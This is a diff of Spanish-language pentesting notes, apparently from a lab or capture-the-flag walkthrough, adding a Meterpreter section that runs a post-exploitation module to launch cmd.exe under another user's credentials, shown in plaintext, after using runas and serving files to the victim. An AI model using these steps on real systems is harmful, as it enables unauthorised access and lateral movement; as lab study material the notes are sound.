@@ -272,4 +272,10 @@ vamos a crear un nuevo proceso con una cmd y migramos hacia ese proceso
 vamos a utilizar runas para poder invocar una nueva shell con las credenciales de otro usuario [Runas](![[Pasted image 20240404145459.png]]) creamos un servidor con `python3` y lo subimos a la maquina victima 
 ![[Pasted image 20240404145243.png]]
 
-### meter
+### meterpreter
+```python
+meterpreter > run post/windows/manage/run_as_psh USER=tstark PASS=playboy69 EXE=cmd.exe
+```
+con las credenciales podemos hacer el cambio para una 
+![[Pasted image 20240404163052.png]]
+
